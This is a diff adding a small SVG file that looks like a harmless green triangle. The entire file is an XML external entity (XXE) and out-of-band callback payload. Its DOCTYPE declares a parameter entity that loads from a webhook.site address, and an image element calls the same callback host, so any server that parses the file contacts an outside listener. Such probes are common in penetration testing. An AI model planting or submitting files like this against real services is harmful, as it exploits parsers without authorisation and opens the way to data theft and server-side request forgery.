@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "3075fd0e-8044-49ee-8a30-29e3ad5d0b04.webhook.site"> %dtd;]>
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <image xlink:href="https://webhook.site/3075fd0e-8044-49ee-8a30-29e3ad5d0b04" width="200" height="200"></image>
+</svg>
